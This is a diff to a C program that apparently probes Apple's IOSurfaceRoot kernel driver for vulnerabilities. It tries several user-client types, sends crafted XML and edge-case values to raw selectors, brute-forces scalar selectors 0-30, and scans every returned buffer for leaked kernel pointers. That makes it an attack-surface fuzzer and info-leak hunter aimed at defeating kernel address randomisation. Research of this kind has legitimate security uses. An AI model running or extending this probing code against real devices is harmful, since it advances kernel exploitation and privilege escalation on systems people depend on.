@@ -16966,31 +16966,56 @@ static void r443_probe(void) {
 
     if (kr != KERN_SUCCESS || conn == 0) {
         rlog("  Failed to open IOSurfaceRoot connection\n");
+        /* Try different user client types */
+        for (int uctype = 0; uctype <= 5; uctype++) {
+            io_service_t svc2 = IOServiceGetMatchingService(kIOMainPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t c2 = 0;
+            kern_return_t kr2 = IOServiceOpen(svc2, mach_task_self(), uctype, &c2);
+            rlog("  UserClientType %d: kr=0x%x conn=0x%x\n", uctype, kr2, c2);
+            if (kr2 == KERN_SUCCESS && c2) { conn = c2; kr = kr2; }
+            IOObjectRelease(svc2);
+            if (kr == KERN_SUCCESS) break;
+        }
+        if (kr != KERN_SUCCESS) return;
+    }
+
+    /* Create a surface via the framework first */
+    IOSurfaceRef test_surf = NULL;
+    uint32_t sid = 0;
+    {
+        int tw = 32, th = 32, tbr = 128, ta = 4096, tpf = 0x42475241;
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef tn[5];
+        tn[0] = CFNumberCreate(NULL, kCFNumberIntType, &tw);
+        tn[1] = CFNumberCreate(NULL, kCFNumberIntType, &th);
+        tn[2] = CFNumberCreate(NULL, kCFNumberIntType, &tbr);
+        tn[3] = CFNumberCreate(NULL, kCFNumberIntType, &ta);
+        tn[4] = CFNumberCreate(NULL, kCFNumberIntType, &tpf);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), tn[0]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), tn[1]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), tn[2]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), tn[3]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), tn[4]);
+        test_surf = IOSurfaceCreate(sp);
+        CFRelease(sp);
+        for (int i = 0; i < 5; i++) CFRelease(tn[i]);
+        if (test_surf) {
+            sid = IOSurfaceGetID(test_surf);
+            rlog("  Created test surface SID=%u\n", sid);
+        }
+    }
+
+    if (sid == 0) {
+        rlog("  Failed to create test surface\n");
+        IOServiceClose(conn);
         return;
     }
 
-    /* Vector A: Send crafted XML with edge-case values */
-    rlog("\n  --- Vector A: Crafted XML via selector 17 (SetValue) ---\n");
+    /* Vector A: Probe raw selectors with crafted XML using valid SID */
+    rlog("\n  --- Vector A: Crafted XML via raw selectors ---\n");
     {
-        /* First, create a surface to work with */
-        const char *create_xml =
-            "<dict>"
-            "<key>IOSurfaceWidth</key><integer>32</integer>"
-            "<key>IOSurfaceHeight</key><integer>32</integer>"
-            "<key>IOSurfaceBytesPerRow</key><integer>128</integer>"
-            "<key>IOSurfaceAllocSize</key><integer>4096</integer>"
-            "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
-            "</dict>";
-
-        uint32_t sid = 0;
-        size_t sid_sz = sizeof(sid);
-
-        /* Selector 0 = s_create */
-        kr = IOConnectCallStructMethod(conn, 0, create_xml, strlen(create_xml),
-            &sid, &sid_sz);
-        rlog("    Create surface via raw sel 0: kr=0x%x sid=%u\n", kr, sid);
-
-        if (kr == KERN_SUCCESS && sid > 0) {
             /* Now try SetValue with crafted XML payloads */
 
             /* Test 1: Very large integer value (potential integer overflow) */
@@ -17159,36 +17184,58 @@ static void r443_probe(void) {
                 }
             }
 
-            /* Test 8: CopyAll — try to dump ALL properties of a surface */
-            rlog("\n  --- Test 8: CopyAll properties ---\n");
-            {
-                char xml[512];
-                snprintf(xml, sizeof(xml),
-                    "<dict><key>IOSurfaceID</key><integer>%u</integer></dict>", sid);
-                uint8_t out[16384];
-                size_t outsz = sizeof(out);
-                memset(out, 0, sizeof(out));
-                /* Selector 18 with no key might return all properties */
-                kr = IOConnectCallStructMethod(conn, 18, xml, strlen(xml), out, &outsz);
-                rlog("    CopyAll: kr=0x%x outsz=%zu\n", kr, outsz);
-                if (kr == KERN_SUCCESS && outsz > 0 && outsz < 1024) {
-                    rlog("    Raw: ");
-                    for (size_t i = 0; i < outsz && i < 256; i++)
-                        rlog("%02x", out[i]);
-                    rlog("\n");
-                    /* Check for kernel pointers */
-                    uint64_t *qw = (uint64_t*)out;
-                    for (size_t i = 0; i < outsz / 8; i++) {
-                        if ((qw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
-                            rlog("    *** KPTR at +%zu: 0x%016llx ***\n", i*8, (unsigned long long)qw[i]);
-                        }
+        /* Test 8: CopyAll — try to dump ALL properties of a surface */
+        rlog("\n  --- Test 8: CopyAll properties ---\n");
+        {
+            char xml[512];
+            snprintf(xml, sizeof(xml),
+                "<dict><key>IOSurfaceID</key><integer>%u</integer></dict>", sid);
+            uint8_t out[16384];
+            size_t outsz = sizeof(out);
+            memset(out, 0, sizeof(out));
+            /* Selector 18 with no key might return all properties */
+            kr = IOConnectCallStructMethod(conn, 18, xml, strlen(xml), out, &outsz);
+            rlog("    CopyAll: kr=0x%x outsz=%zu\n", kr, outsz);
+            if (kr == KERN_SUCCESS && outsz > 0 && outsz < 1024) {
+                rlog("    Raw: ");
+                for (size_t i = 0; i < outsz && i < 256; i++)
+                    rlog("%02x", out[i]);
+                rlog("\n");
+                /* Check for kernel pointers */
+                uint64_t *qw = (uint64_t*)out;
+                for (size_t i = 0; i < outsz / 8; i++) {
+                    if ((qw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("    *** KPTR at +%zu: 0x%016llx ***\n", i*8, (unsigned long long)qw[i]);
                     }
                 }
+            }
+        }
+
+        /* Test 9: Try IOConnectCallScalarMethod for different data format */
+        rlog("\n  --- Test 9: Scalar method calls ---\n");
+        for (int sel = 0; sel <= 30; sel++) {
+            uint64_t sin[6] = { sid, 0, 0, 0, 0, 0 };
+            uint64_t sout[16] = {0};
+            uint32_t outcnt = 16;
+            kr = IOConnectCallScalarMethod(conn, sel, sin, 1, sout, &outcnt);
+            if (kr == KERN_SUCCESS) {
+                rlog("    scalar sel %d: outcnt=%u", sel, outcnt);
+                for (uint32_t j = 0; j < outcnt && j < 4; j++)
+                    rlog(" [%u]=0x%llx", j, (unsigned long long)sout[j]);
+                rlog("\n");
+                for (uint32_t j = 0; j < outcnt; j++) {
+                    if ((sout[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        rlog("      *** KPTR in scalar output! ***\n");
+                    }
+                }
+            } else if (kr != 0xe00002c2 && kr != 0xe00002bc /* badArg */) {
+                rlog("    scalar sel %d: kr=0x%x\n", sel, kr);
             }
         }
     }
     fflush(stdout);
 
+    if (test_surf) CFRelease(test_surf);
     IOServiceClose(conn);
 
     rlog("\n=== r443 complete ===\n");
